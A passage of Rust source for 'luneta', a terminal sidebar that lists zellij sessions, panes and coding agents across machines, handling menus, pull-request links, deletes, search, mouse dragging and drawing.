    /// luneta found where the key of the menu numbered `menu`, for a pull
    /// request, an issue or a file, goes, as `found` says, or why it found
    /// nothing: the menu goes on, while it waits on it.
    pub fn pulled(&mut self, menu: u64, found: Result<Found, String>) -> Asked {
        let Some(waiting) = self.menu.take_if(|it| it.number() == menu && it.pulling()) else {
            return Asked::Nothing;
        };
        if let Some(off_branch) = waiting.off_branch(&found) {
            self.say(off_branch);
        }
        self.menu_did(waiting.pulled(found))
    }

    /// luneta kept what the pane of the menu numbered `menu` printed, as
    /// `printed` says, or why it kept nothing: the menu goes on, while it
    /// waits on it.
    pub fn printed(&mut self, menu: u64, printed: Result<Printed, String>) -> Asked {
        let Some(waiting) = self.menu.take_if(|it| it.number() == menu && it.reading()) else {
            return Asked::Nothing;
        };
        self.menu_did(waiting.printed(printed))
    }

    /// luneta kept the logs of the checks that failed on the pull request of
    /// the menu numbered `menu`, as `checks` says, or why it kept none: the
    /// menu goes on, while it waits on them.
    pub fn checks(&mut self, menu: u64, checks: Result<checks::Failing, String>) -> Asked {
        let Some(waiting) = self.menu.take_if(|it| it.number() == menu && it.fetching()) else {
            return Asked::Nothing;
        };
        self.menu_did(waiting.checked(checks))
    }

    /// Every pane of `on` the daemon says a directory of, in the order of the
    /// rows, for luneta to find where a key of the menu for a pull request
    /// goes: where each works, as its row says, the pull request of the
    /// branch checked out there, by its page, and whether luneta's zellij is
    /// in its session. A daemon older than the page says none of one. Of
    /// this machine, none while lunetad has said nothing; of another, why
    /// luneta knows none: lunetad does not reach it, as it last said, and a
    /// key found among none would make a session for the link there, which
    /// one of its sessions may work in.
    fn worked(&self, on: &Machine) -> Result<Vec<Worked>, String> {
        let Some(seen) = self.seen(on) else {
            return match on {
                Machine::Local => Ok(Vec::new()),
                Machine::Remote(destination) => {
                    Err(format!("lunetad does not reach {destination} now"))
                },
            };
        };
        let here = self.here().filter(|_| self.on == *on);
        let agents = seated(seen.agents, seen.sessions);
        let pulls = pull_requests(seen.pull_requests);
        let (mut sessions, _) = oldest_first(seen.sessions);
        // In the order you moved them to, as their rows go.
        self.order.sessions(on, &mut sessions, |(listed, _)| listed.name.as_str());
        let mut worked = Vec::new();
        for (listed, session) in sessions {
            let mut panes: Vec<&Pane> =
                session.panes.iter().flat_map(|panes| &panes.panes).collect();
            panes.sort_by_key(|pane| (pane.tab, pane.id));
            for pane in panes {
                let dir = match agents.get(&(session.name.as_str(), pane.id)) {
                    Some(agent) => Some(agent_dir(agent, pane)),
                    None => pane.cwd.as_deref(),
                };
                let Some(dir) = dir else {
                    continue;
                };
                let pull = pulls.get(dir).and_then(|it| Link::parse(it.url.as_deref()?));
                let here = here == Some(session.name.as_str());
                let it = links::Worked { dir: dir.to_owned(), pull, here };
                worked.push(Worked { session: listed.clone(), pane: pane.id, works: it });
            }
        }
        Ok(worked)
    }

    /// Each machine other than `on`, in the order of the rows, with what
    /// `worked` says of it, for a key of the menu for a link where `on` has
    /// none of its repository: where it works, or why luneta knows none of
    /// its panes.
    fn others(&self, on: &Machine) -> Others {
        let Some(host) = &self.host else {
            return Vec::new();
        };
        let (arranged, _) = machines(host).arranged(&self.order);
        let others = arranged.into_iter().map(|Arranged { machine, .. }| machine);
        others
            .filter(|machine| machine != on)
            .map(|machine| {
                let worked = self.worked(&machine);
                (machine, worked)
            })
            .collect()
    }

    /// What deleting what `deletes` deletes of `listed`, of the machine
    /// `on`, does, as the sidebar knows that machine now: for the menu, and
    /// for the picker. Nothing goes of another machine lunetad last said it
    /// does not reach, whether or not lunetad answers now: luneta knows none
    /// of its sessions, nor which one to leave for first.
    pub fn plan(&self, on: &Machine, listed: &Listed, deletes: Deletes) -> Result<Plan, String> {
        if let Some(why) = self.out_of_reach(on) {
            return Err(why);
        }
        close::plan(&self.subject(on, listed, deletes))
    }

    /// What the menu says of a key that acts on `on`, another machine, while
    /// lunetad does not reach it: none where it does, or `on` is this one.
    fn out_of_reach(&self, on: &Machine) -> Option<String> {
        match on {
            Machine::Remote(destination) if self.seen(on).is_none() => {
                Some(format!("menu: lunetad does not reach {destination} now"))
            },
            Machine::Remote(_) | Machine::Local => None,
        }
    }

    /// What the delete is for, as the sidebar knows it: `listed`, of the
    /// machine `on`, where luneta's zellij is, and what it `deletes`.
    fn subject<'a>(&'a self, on: &Machine, listed: &'a Listed, deletes: Deletes) -> Subject<'a> {
        let session = listed.name().as_str();
        let seat = match (self.going(), self.here()) {
            // In a session of another machine's, which this one's go on
            // without.
            (None, _) if self.on != *on => Seat::Elsewhere,
            (None, Some(here)) if here == session => Seat::In,
            (None, Some(_)) => Seat::Elsewhere,
            (Some(_), _) | (None, None) => Seat::Moving,
        };
        let mut agents = Err(Untold::Away);
        let mut refuge: Option<Listed> = None;
        if let Some(seen) = self.seen(on) {
            // What lunetad said last of the agents may be out of date while it
            // does not answer: one may have gone to work, or started since.
            if self.away.is_none() {
                agents = seen.unread_seats().map_err(Untold::Unplaced).map(|unread| {
                    let seated = seated(seen.agents, seen.sessions);
                    let doing = seated.iter().filter(|((at, _), _)| *at == session);
                    let doing =
                        doing.map(|((_, pane), agent)| (*pane, close::Doing::from(*agent)));
                    doing.chain(close::unread_in(&unread, session)).collect()
                });
            }
            // The newest of the machine's other sessions, which the picker
            // lists first.
            let (sessions, _) = oldest_first(seen.sessions);
            let mut others = sessions.into_iter().map(|(listed, _)| listed);
            refuge = others.rfind(|listed| listed.name.as_str() != session);
        }
        Subject { session: listed, seat, deletes, agents, refuge: refuge.map(Place::Session) }
    }

    /// Asks for a brief of what the menu's row `briefed` it on: every
    /// session of every machine, in the rows' order, or a machine's, or a
    /// session, or the agent in a pane. An agent is told of as its row shows
    /// it, a folded session's or machine's too, by the name, the status and
    /// the branch on its row, and by its machine, whose daemon reads its
    /// transcript. A machine lunetad does not reach now is told of as one
    /// whose sessions are unknown. With no agent there, or none whose
    /// transcript luneta can read, or no word of its machine, as of one it
    /// does not reach, or no longer watches, the sidebar says so where the
    /// menu was.
    fn brief(&mut self, briefed: Briefed) -> Asked {
        let Some(host) = &self.host else {
            return Asked::Nothing;
        };
        let machines = machines(host);
        let mut reached = vec![(Machine::Local, machines.here)];
        let mut unknown = Vec::new();
        for (destination, seen) in machines.others {
            match seen {
                Ok(seen) => reached.push((Machine::Remote(destination), seen)),
                Err(away) => unknown.push((destination, away.said().0)),
            }
        }
        // In the order of their rows, as you moved them.
        self.order.machines(&mut reached, |(machine, _)| machine);
        let mut every: Vec<(Machine, SessionName)> = Vec::new();
        let mut notes = Vec::new();
        for (machine, seen) in &reached {
            let (mut sessions, _) = oldest_first(seen.sessions);
            self.order.sessions(machine, &mut sessions, |(listed, _)| listed.name.as_str());
            let agents = seated(seen.agents, seen.sessions);
            let trees: HashMap<&str, &lunetad::api::WorkTree> =
                seen.work_trees.iter().map(|tree| (tree.dir.as_str(), tree)).collect();
            for (listed, session) in sessions {
                every.push((machine.clone(), listed.name.clone()));
                let mut panes: Vec<_> =
                    session.panes.iter().flat_map(|panes| &panes.panes).collect();
                panes.sort_by_key(|pane| (pane.tab, pane.id));
                for pane in panes {
                    let Some(agent) = agents.get(&(session.name.as_str(), pane.id)) else {
                        continue;
                    };
                    let cwd = agent_dir(agent, pane);
                    let branch = trees.get(cwd).and_then(|tree| {
                        checkout(&WorkTree::of_api(tree)?, None).map(|checkout| checkout.branch)
                    });
                    notes.push(Note {
                        on: machine.clone(),
                        session: listed.name.clone(),
                        pane: pane.id,
                        name: label(Some(agent), pane),
                        status: status_word(agent),
                        since: agent.status_since.and_then(|at| at.try_into().ok()),
                        branch,
                        cwd: cwd.to_owned(),
                        transcript: transcript(agent),
                    });
                }
            }
        }
        let on = match &briefed {
            Briefed::Every => None,
            Briefed::Machine(on) | Briefed::Session(on, _) | Briefed::Agent(on, ..) => Some(on),
        };
        if let Some(on @ Machine::Remote(destination)) = on
            && !reached.iter().any(|(machine, _)| machine == on)
        {
            self.say(format!("brief: lunetad does not reach {destination} now"));
            return Asked::Nothing;
        }
        let over = match briefed {
            Briefed::Every => Over::Sessions { sessions: every, unknown },
            Briefed::Machine(on) => {
                let of = every.into_iter().filter(|(machine, _)| *machine == on);
                let sessions = of.map(|(_, session)| session).collect();
                Over::Machine(on, sessions)
            },
            Briefed::Session(on, session) => Over::Session(on, session),
            Briefed::Agent(on, session, pane) => Over::Agent(on, session, pane),
        };
        match Brief::new(over, notes) {
            Ok(brief) => Asked::Brief(brief),
            Err(reason) => {
                self.say(reason);
                Asked::Nothing
            },
        }
    }

    /// Has zellij on `on` do what a delete key planned, and the highlight go
    /// past the rows it takes away, once they are gone.
    fn delete(&mut self, on: Machine, act: Act) -> Asked {
        let takes_place = |place: &Place| match (&act, place.pane()) {
            (Act::Pane { session, pane, .. }, Some(at)) => {
                place.session() == session.as_str() && at == *pane
            },
            (Act::Tab { session, panes, .. }, Some(at)) => {
                place.session() == session.as_str() && panes.contains(&at)
            },
            (Act::Pane { .. } | Act::Tab { .. }, None) => false,
            (Act::Kill { session, .. } | Act::Leave { session, .. }, _) => {
                place.session() == session.as_str()
            },
        };
        let takes = |spot: &Spot| {
            spot.place().is_some_and(|place| spot.machine() == on && takes_place(place))
        };
        if let Some(gone) = self.cursor.clone().filter(|cursor| takes(cursor)) {
            let at = self.cursor_index().unwrap_or(0);
            let stays = |index: &usize| {
                let row = &self.rows[*index];
                row.stops() && !takes(&row.spot())
            };
            let after = (at..self.rows.len()).chain((0..at).rev()).find(stays);
            let after = after.map(|index| self.rows[index].spot());
            self.closing = Some(Closing { gone, after });
        }
        Asked::Delete { on, act }
    }

    /// zellij opened the terminal `opened` for the menu numbered `menu`, or
    /// says why it did not. luneta takes its client there while the menu
    /// still waits on it: one closed since is no longer what you are on. A
    /// session zellij made for it is the one the daemon lists by its name,
    /// as it does by the time zellij opens a tab of it.
    pub fn opened(&mut self, menu: u64, opened: Result<u32, String>) -> Asked {
        let waiting = self.menu.take_if(|it| it.number() == menu && it.opening().is_some());
        let Some((opening, on)) =
            waiting.as_ref().and_then(|it| Some((it.opening()?, it.target().machine().clone())))
        else {
            return Asked::Nothing;
        };
        let pane = match opened {
            Ok(pane) => pane,
            Err(why) => {
                let said = match opening {
                    Opening::Turned(_) => "not turned",
                    Opening::In(_) | Opening::Made(_) => "nothing opened",
                };
                self.say(format!("menu: {said}: {why}"));
                return Asked::Nothing;
            },
        };
        let made = match opening {
            Opening::In(session) | Opening::Turned(session) => {
                let place = Place::Pane(PanePlace { session: session.clone(), pane });
                return Asked::Go { on, place };
            },
            Opening::Made(made) => made,
        };
        let sessions = self.seen(&on).map(|seen| oldest_first(seen.sessions).0);
        let mut named = sessions.into_iter().flatten().filter(|(listed, _)| listed.name == *made);
        if let (Some((session, _)), None) = (named.next(), named.next()) {
            return Asked::Go { on, place: Place::Pane(PanePlace { session, pane }) };
        }
        self.say(format!("menu: zellij opened pane {pane} in {made}, which luneta cannot tell"));
        Asked::Nothing
    }

    /// What came of zellij turning the tab of the pane `pane` of the menu
    /// numbered `menu` into panes of another: luneta goes to the pane, once all
    /// moved. Once some did, the menu says how many went, not that none did,
    /// and luneta stays where it is, as the pane may have stayed too.
    pub fn turned_into_panes(
        &mut self,
        menu: u64,
        pane: u32,
        came: Result<IntoPanes, String>,
    ) -> Asked {
        match came {
            Ok(IntoPanes::Done) => self.opened(menu, Ok(pane)),
            Ok(IntoPanes::Partly { moved, of, why }) => {
                if self.waits_on(menu) {
                    self.close_menu();
                    self.say(format!("menu: turned {moved} of {of} panes: {why}"));
                }
                Asked::Nothing
            },
            Err(why) => self.opened(menu, Err(why)),
        }
    }

    /// Whether the menu numbered `menu` still waits for zellij to open what a
    /// key asked for, or to turn it: one closed since is no longer what you
    /// are on.
    pub fn waits_on(&self, menu: u64) -> bool {
        self.menu.as_ref().is_some_and(|it| it.number() == menu && it.opening().is_some())
    }

    /// zellij said which tabs the tab of the pane of the menu numbered `menu`
    /// can turn into, or why it could not: the menu goes on, while it waits
    /// on it.
    pub fn tabs(&mut self, menu: u64, tabs: Result<Vec<OtherTab>, String>) -> Asked {
        let Some(waiting) = self.menu.take_if(|it| it.number() == menu && it.listing()) else {
            return Asked::Nothing;
        };
        self.menu_did(waiting.tabs(tabs))
    }

    /// zellij said what closing the pane of the menu numbered `menu` closes,
    /// or why it could not: the menu plans its delete key by it, while it
    /// waits on it.
    pub fn closes(&mut self, menu: u64, closes: Result<Closes, String>) -> Asked {
        let waiting = self.menu.as_ref().filter(|it| it.number() == menu);
        let Some(((session, pane), on)) =
            waiting.and_then(|it| Some((it.planning()?, it.target().machine())))
        else {
            return Asked::Nothing;
        };
        let (session, on) = (session.clone(), on.clone());
        let plan = match closes {
            Ok(closes) => self.plan(&on, &session, Deletes::Pane { pane, closes }),
            Err(why) => Err(format!("menu: nothing closed: {why}")),
        };
        self.planned(plan)
    }

    /// The finder found `skills` for the menu numbered `menu`, or says why it
    /// found none, for its search box.
    pub fn found(&mut self, menu: u64, agent: agents::Harness, skills: Result<Vec<Skill>, String>) {
        if let Some(open) = self.menu.as_mut().filter(|it| it.number() == menu) {
            open.found(agent, skills);
        }
    }

    /// Marks the highlighted pane read at `now`, as going there would, while
    /// its row has the dot, whatever gave it the dot. Otherwise marks it
    /// unread, so that its row has the dot until you go there again: a visit
    /// any luneta is on already started before now, and the next starts
    /// after.
    fn toggle_unread(&mut self, now: SystemTime) {
        let Some(spot) = &self.cursor else {
            return;
        };
        let Some(Row::Pane { session, pane, unread, marked, .. }) =
            self.rows.iter().find(|row| row.spot() == *spot)
        else {
            return;
        };
        let key = session.key(*pane);
        if dotted(*unread, marked.as_ref()) {
            self.news.read(key, self.finished.get(&key).copied(), now);
        } else {
            self.news.mark_unread(key, now);
        }
        self.rebuild();
    }

    /// What a key does while the search is open, with `term` typed in it:
    /// every character types, `j` and `h` too. `Esc` closes it, and so does
    /// `Backspace` once there is nothing left to take back, as in less and vim.
    fn search_key(&mut self, key: &KeyEvent, mut term: String) -> Asked {
        match key.code {
            KeyCode::Down => self.step(1),
            KeyCode::Up => self.step(-1),
            KeyCode::Home => self.end(false),
            KeyCode::End => self.end(true),
            KeyCode::Enter => return self.go(),
            KeyCode::Esc => self.close_search(),
            KeyCode::Backspace if term.is_empty() => self.close_search(),
            KeyCode::Backspace => {
                term.pop();
                self.find(term);
            },
            KeyCode::Char(c) => {
                term.push(c);
                self.find(term);
            },
            _ => {},
        }
        Asked::Nothing
    }

    /// What is typed in the search, while it is open.
    fn search(&self) -> Option<&str> {
        self.search.as_ref().map(|search| match search {
            Search::Empty => "",
            Search::Typed { term, .. } => term.as_str(),
        })
    }

    /// Opens the search with `term` in it, or puts `term` in the open one.
    /// The highlight goes to the row that matches it best. An empty `term`
    /// narrows nothing.
    fn find(&mut self, term: String) {
        let search =
            if term.is_empty() { Search::Empty } else { Search::Typed { term, seek: true } };
        self.search = Some(search);
        self.rebuild();
    }

    /// Closes the search, and brings back every row, the highlight on the row
    /// it was on.
    fn close_search(&mut self) {
        if self.search.take().is_some() {
            self.rebuild();
        }
    }

    /// Goes to the highlighted row, on this machine or another. Going
    /// anywhere closes the search, so that the sidebar you come back to shows
    /// every row. A machine's header is no place to go, and folds the other
    /// way.
    fn go(&mut self) -> Asked {
        let Some(spot) = self.cursor.clone() else {
            return Asked::Nothing;
        };
        let on = spot.machine();
        match spot {
            Spot::Machine(_) => {
                self.toggle();
                Asked::Nothing
            },
            Spot::Local(place) | Spot::Remote(_, place) => {
                self.close_search();
                Asked::Go { on, place }
            },
        }
    }

    /// What the mouse does over the sidebar, drawn in `area`. A click, the
    /// left button let go on the line it went down on, on a pane goes there,
    /// and on a session's `▾` or `▸` folds it. A session with no panes under
    /// it, folded or not, goes to the session. A click on the notes goes
    /// nowhere, as the rows under them are not on screen. A click that goes
    /// nowhere takes the focus, as any other button does. The left button
    /// lifts the session whose row it went down on, or the machine whose
    /// header, once the mouse moves a line, and lets go of it where it shows;
    /// anywhere else, or moving along the line first, it sweeps over the text,
    /// which it copies as it lets go; and the wheel scrolls.
    pub fn mouse(&mut self, mouse: MouseEvent, area: Rect) -> Asked {
        // A click or the wheel drops a `g` or a `y` pressed before it, as a key
        // does.
        // The pointer moving does not: luneta hears every move.
        if matches!(
            mouse.kind,
            MouseEventKind::Down(_) | MouseEventKind::ScrollDown | MouseEventKind::ScrollUp
        ) {
            self.pending = Pending::Nothing;
        }
        match mouse.kind {
            MouseEventKind::ScrollDown => {
                self.top = (self.top + 3).min(self.lines().saturating_sub(1));
                Asked::Nothing
            },
            MouseEventKind::ScrollUp => {
                self.top = self.top.saturating_sub(3);
                Asked::Nothing
            },
            MouseEventKind::Down(MouseButton::Left) => {
                self.close_menu();
                self.unselect();
                self.arriving = None;
                let row = self.line_of(mouse.row, area).and_then(|line| self.row_at(line));
                let column = mouse.column.saturating_sub(area.x);
                let lifts = row.and_then(|at| self.lifting(at, column));
                let at = Position::new(mouse.column, mouse.row);
                self.moving = Moving::Down { at, lifts };
                Asked::Nothing
            },
            MouseEventKind::Down(_) => Asked::Take,
            MouseEventKind::Drag(MouseButton::Left) => self.drag(mouse, area),
            MouseEventKind::Up(MouseButton::Left) => self.release(mouse, area),
            // The button let go where luneta did not hear it, as outside its
            // window: what it lifted goes back, and what it swept is not
            // copied. A selection is the keys'.
            MouseEventKind::Moved => {
                self.let_go();
                Asked::Nothing
            },
            _ => Asked::Nothing,
        }
    }

    /// The mouse moves with the left button down: what it lifted goes with
    /// it, and a session pressed on its row, or a machine on its header, is
    /// lifted once the mouse moves a line, and takes the focus, for `Esc` to
    /// put it back. What is typed in the search lifts none: it leaves out of
    /// sight the places it could take. What lifts nothing sweeps, once the
    /// mouse is past the cells around where it went down: a hand that clicks
    /// moves a little, as desktops allow it a few pixels, and that is a click
    /// all the same.
    fn drag(&mut self, mouse: MouseEvent, area: Rect) -> Asked {
        let line = mouse.row.saturating_sub(area.y);
        let over = (area.left()..area.right()).contains(&mouse.column);
        let pointer = Position::new(mouse.column, mouse.row);
        let (from, lifts) = match &mut self.moving {
            Moving::Lifted(lift) => {
                lift.line = line;
                lift.over = over;
                return Asked::Nothing;
            },
            Moving::Sweeping(sweep) => {
                sweep.reach(pointer, inside(area));
                return Asked::Nothing;
            },
            Moving::Down { at, lifts } => (*at, lifts.clone().filter(|_| mouse.row != at.y)),
            Moving::Selected(_)
            | Moving::Carrying(..)
            | Moving::Asking(..)
            | Moving::Swept(..)
            | Moving::Still => return Asked::Nothing,
        };
        let typed = matches!(self.search, Some(Search::Typed { .. }));
        let mut lifts = lifts.filter(|lifts| !typed && self.row_of(&lifts.spot()).is_some());
        if let Some(Lifting::Carried(carrying)) = &lifts
            && let Err(why) = self.carry_plan(carrying)
        {
            self.notify(format!("not moved: {why}"));
            lifts = None;
            self.moving = Moving::Down { at: from, lifts: None };
        }
        if let Some(lifted) = lifts {
            self.moving = Moving::Lifted(Lift { lifted, line, over, scrolled: None });
            return Asked::Take;
        }
        if from.x.abs_diff(pointer.x) > 1 || from.y.abs_diff(pointer.y) > 1 {
            self.moving = Moving::Sweeping(Sweep::new(from, pointer, inside(area)));
        }
        Asked::Nothing
    }

    /// The left button lets go: a press that is on the line it went down on
    /// is a click there, and what it lifted lands where it shows, the
    /// highlight on it, among the rows as the order is kept now, as `shift`
    /// moves them. What it swept is copied, as it shows on the last frame, and
    /// shows on; over nothing but blanks nothing is copied, and nothing shows on
    /// to say that it was.
    fn release(&mut self, mouse: MouseEvent, area: Rect) -> Asked {
        let over = (area.left()..area.right()).contains(&mouse.column);
        match std::mem::take(&mut self.moving) {
            Moving::Down { at, .. } if over && mouse.row == at.y => self.click(at, area),
            Moving::Lifted(Lift { lifted: Lifting::Moved(movable), .. }) => {
                let line = mouse.row.saturating_sub(area.y);
                self.reorder();
                self.cursor = Some(movable.spot());
                match self.landing(&movable, line, over) {
                    Some((spans, _)) if spans != self.spans(&movable) => self.keep(spans),
                    _ => self.settle(None, false),
                }
                Asked::Nothing
            },
            Moving::Lifted(Lift { lifted: Lifting::Carried(carrying), .. }) => {
                let line = mouse.row.saturating_sub(area.y);
                if let Some(landing) = self.carry_landing(&carrying, line, over) {
                    return self.land_on(carrying, landing);
                }
                self.cursor = Some(carrying.spot());
                self.settle(None, false);
                Asked::Nothing
            },
            Moving::Sweeping(mut sweep) => {
                sweep.reach(Position::new(mouse.column, mouse.row), inside(area));
                let text = sweep.text(&self.page, inside(area));
                if text.is_empty() {
                    return Asked::Nothing;
                }
                self.moving = Moving::Swept(sweep, self.laid.clone());
                Asked::CopyText(text)
            },
            // A selection is the keys', and no press of the sidebar's.
            kept @ (Moving::Selected(_)
            | Moving::Carrying(..)
            | Moving::Asking(..)
            | Moving::Swept(..)) => {
                self.moving = kept;
                Asked::Nothing
            },
            Moving::Down { .. } | Moving::Still => Asked::Nothing,
        }
    }

    /// A click at `at`, on luneta's terminal. One on a machine's header folds
    /// it the other way, wherever on the line it is, but while a search is
    /// typed.
    fn click(&mut self, at: Position, area: Rect) -> Asked {
        let Some(index) = self.line_of(at.y, area).and_then(|line| self.row_at(line)) else {
            return Asked::Take;
        };
        let row = &self.rows[index];
        let spot = row.spot();
        // What is typed shows the rows it finds whatever the folds, so there
        // a fold would show only once the search closes. An empty search
        // keeps them.
        let typed = matches!(self.search, Some(Search::Typed { .. }));
        if matches!(row, Row::Machine { .. }) {
            if !typed {
                self.cursor = Some(spot);
                self.toggle();
            }
            return Asked::Take;
        }
        if matches!(row, Row::Session { .. }) {
            // There the triangle is the name's.
            let on_triangle = at.x.saturating_sub(area.x) <= 2;
            if on_triangle && !typed {
                self.cursor = Some(spot);
                self.toggle();
                return Asked::Take;
            }
            // The name of a session that lists its panes is no place to go.
            if !row.stops() {
                return Asked::Take;
            }
        }
        self.cursor = Some(spot);
        match self.go() {
            Asked::Nothing => Asked::Take,
            asked => asked,
        }
    }

    /// The line of all the rows that the line `y` of luneta's terminal shows
    /// of them, with the sidebar in `area`: none on the title or the rule
    /// along the top, nor on the notes at the bottom.
    fn line_of(&self, y: u16, area: Rect) -> Option<usize> {
        let line = usize::from(y.saturating_sub(area.y));
        let shown = line.checked_sub(HEADER).filter(|line| *line < self.room)?;
        Some(self.top + shown)
    }

    /// Whether the left button is down on the sidebar, which has what the
    /// mouse does until it lets go, wherever the mouse goes.
    pub fn pressed(&self) -> bool {
        matches!(self.moving, Moving::Down { .. } | Moving::Lifted(_) | Moving::Sweeping(_))
    }

    /// Drops what a sweep left showing, as the next click does, wherever that
    /// is.
    pub fn unsweep(&mut self) {
        if let Moving::Swept(..) = self.moving {
            self.moving = Moving::Still;
        }
    }

    /// Lets go of what the left button holds on the sidebar, as a release it
    /// never hears: what it lifted goes back, the press is no click, and what
    /// it swept is not copied. A selection is the keys', and stays.
    pub fn let_go(&mut self) {
        if self.pressed() {
            self.moving = Moving::Still;
        }
    }

    /// Whether the rows scroll under what the mouse lifted, as `hold` scrolls
    /// them.
    pub fn scrolling(&self) -> bool {
        self.pull() != 0
    }

    /// Which way the rows scroll under what the mouse lifted, as it holds it
    /// on their first line, or above, or on their last, or below: up while
    /// there are lines above the first, and down while there are below the
    /// last.
    fn pull(&self) -> isize {
        let Moving::Lifted(lift) = &self.moving else {
            return 0;
        };
        if !lift.over {
            return 0;
        }
        let line = usize::from(lift.line);
        let up = line <= HEADER && self.top > 0;
        let down = line + 1 >= HEADER + self.room && self.top + self.room < self.lines();
        isize::from(down) - isize::from(up)
    }

    /// Scrolls the rows a line under what the mouse lifted, as it holds it on
    /// their first line or their last, at `at`, once each `SCROLL`.
    fn hold(&mut self, at: Instant) {
        let by = self.pull();
        let Moving::Lifted(lift) = &mut self.moving else {
            return;
        };
        if by == 0 {
            lift.scrolled = None;
            return;
        }
        if lift.scrolled.is_some_and(|then| at.saturating_duration_since(then) < SCROLL) {
            return;
        }
        lift.scrolled = Some(at);
        self.top = self.top.saturating_add_signed(by);
    }

    /// How many lines all the rows take.
    fn lines(&self) -> usize {
        self.rows.iter().map(Row::height).sum()
    }

    /// The row on `line` of all the rows, if one is.
    fn row_at(&self, line: usize) -> Option<usize> {
        let mut start = 0;
        for (at, row) in self.rows.iter().enumerate() {
            let end = start + row.height();
            if line < end {
                return Some(at);
            }
            start = end;
        }
        None
    }

    /// Where the highlight is, and which of its two it is.
    fn highlight(&self) -> Highlight {
        if self.keys.held() {
            return Highlight::Lit(self.cursor_index());
        }
        let row = self.here_row.as_ref().and_then(|spot| self.row_of(spot));
        row.map_or(Highlight::Off, Highlight::Resting)
    }

    /// Scrolls so that the row `at` shows on `room` lines.
    fn reveal(&mut self, at: usize, room: usize) {
        let start: usize = self.rows[..at].iter().map(Row::height).sum();
        let end = start + self.rows[at].height();
        if start < self.top {
            self.top = start;
        } else if end > self.top + room {
            self.top = end.saturating_sub(room);
        }
        // The row shows whole, where it fits.
        if end - start <= room {
            assert!(self.top <= start);
            assert!(end <= self.top + room);
        }
    }

    /// Draws the sidebar into `area`, the highlight on its row: where the keys
    /// took it while the sidebar has the focus, over the rows of each session
    /// or machine a selection holds, and on the pane luneta's zellij is on
    /// while it does not, softer, which the view scrolls to show as the pane
    /// changes. What the mouse lifted has it, where it lands, the others
    /// making room for it. Its last column is the edge, drawn as the title's
    /// rule is.
    /// What the mouse swept shows reversed over it all.
    /// Says the spots on the menu at its bottom, or on the legend, and on the
    /// numbers of the pull requests on its rows.
    pub fn draw(&mut self, buffer: &mut Buffer, area: Rect, now: SystemTime) -> Drawn {
        self.drawing(now);
        let width = usize::from(area.width.saturating_sub(1));
        let height = usize::from(area.height);
        let frame = frame(now);
        let mut lines: Vec<Line<'static>> = Vec::with_capacity(height);
        lines.extend(self.top(width, frame));
        let (notes, spotted, buttons) = self.notes(width, height, frame);
        let room = height.saturating_sub(HEADER + notes.lines.len());
        self.room = room;
        let highlight = self.highlight();
        let landing = match &self.moving {
            Moving::Lifted(Lift { lifted: Lifting::Moved(movable), line, over, .. }) => {
                self.landing(movable, *line, *over)
            },
            _ => None,
        };
        let carried = match &self.moving {
            Moving::Lifted(Lift { lifted: Lifting::Carried(carrying), line, over, .. }) => {
                Some((carrying.clone(), self.carry_landing(carrying, *line, *over), false))
            },
            Moving::Carrying(carrying, landing) => Some((carrying.clone(), landing.clone(), true)),
            Moving::Asking(carrying, landing) => {
                Some((carrying.clone(), Some(landing.clone()), true))
            },
            _ => None,
        };
        let lifted = landing.is_some() || matches!(carried, Some((_, _, false)));
        match highlight {
            Highlight::Lit(at) => {
                // The mouse scrolls the rows under what it lifted.
                if let Some(at) = at
                    && !lifted
                {
                    self.reveal(at, room);
                }
                self.revealed = None;
            },
            Highlight::Resting(at) if self.revealed != self.here_row => {
                self.reveal(at, room);
                self.revealed.clone_from(&self.here_row);
            },
            Highlight::Resting(_) | Highlight::Off => {},
        }
        if self.host.is_none() {
            let waiting = if self.away.is_some() { "" } else { "asking lunetad…" };
            lines.push(Line::styled(
                format!(" {waiting}"),
                Style::new().add_modifier(Modifier::DIM),
            ));
        } else if self.rows.is_empty() {
            let typed = matches!(self.search, Some(Search::Typed { .. }));
            let none = if typed { " no match" } else { " no sessions" };
            lines.push(Line::styled(none, Style::new().add_modifier(Modifier::DIM)));
        }
        let carried_rows = carried.as_ref().map(|(carrying, ..)| self.carried_rows(carrying));
        let landed_on = carried.as_ref().and_then(|(carrying, landing, _)| {
            let landing = landing.as_ref()?;
            let after = self.shows_after(&carrying.machine, landing)?;
            Some((self.row_of(&Spot::on(&carrying.machine, landing.place()))?, after))
        });
        let lit = match (&landing, &carried_rows, highlight) {
            (Some((_, lifted)), _, _) => Some((lifted.clone(), LIT)),
            (None, Some(rows), _) => Some((rows.clone(), LIT)),
            (None, None, Highlight::Lit(at)) => {
                let held = self.selected().map(|(spans, held)| {
                    let rows = spans.rows();
                    rows[held.start].start..rows[held.end - 1].end
                });
                held.or(at.map(|at| at..at + 1)).map(|rows| (rows, LIT))
            },
            (None, None, Highlight::Resting(at)) => Some((at..at + 1, RESTING)),
            (None, None, Highlight::Off) => None,
        };
        let order = match (&landing, &carried_rows, landed_on) {
            (Some((spans, _)), _, _) => self.landed(&spans.rows()),
            (None, Some(rows), Some((_, after))) => set_down(self.rows.len(), rows, after),
            _ => (0..self.rows.len()).collect::<Vec<_>>(),
        };
        let mut carried_lines: Option<Range<usize>> = None;
        let mut drawn: Vec<Line<'static>> = Vec::new();
        // Where each number is, by its line among all those of the rows. None
        // takes a click under what the mouse lifted.
        let mut numbers = Vec::new();
        // And where each cut's `…` is, by the same.
        let mut cuts = Vec::new();
        let mut rows = Vec::with_capacity(order.len());
        for at in order {
            let row = &self.rows[at];
            let on = lit.as_ref().filter(|(rows, _)| rows.contains(&at));
            let target = landed_on.is_some_and(|(target, _)| target == at);
            let background = on.map(|(_, background)| *background).or(target.then_some(RESTING));
            let RowLines { lines: row_drawn, number, cuts: row_cuts } =
                row_lines(row, width, frame, now);
            if !lifted
                && let Some(number) = number
            {
                numbers.push(NumberAt { line: drawn.len() + number.line, ..number });
            }
            let first = drawn.len();
            if carried_rows.as_ref().is_some_and(|rows| rows.contains(&at)) {
                let start = carried_lines.as_ref().map_or(first, |lines| lines.start);
                carried_lines = Some(start..first + row_drawn.len());
            }
            cuts.extend(row_cuts.into_iter().map(|cut| CutAt { line: first + cut.line, ..cut }));
            rows.push((row.spot(), row_drawn.len()));
            for mut line in row_drawn {
                if let Some(background) = background {
                    line = line.patch_style(Style::new().bg(background));
                }
                drawn.push(line);
            }
        }
        if let (Some((_, _, true)), Some(lines)) = (&carried, carried_lines) {
            if lines.start < self.top {
                self.top = lines.start;
            } else if lines.end > self.top + room {
                self.top = lines.end.saturating_sub(room).min(lines.start);
            }
        }
        self.top = self.top.min(drawn.len().saturating_sub(1));
        let bottom = notes.lines.len();
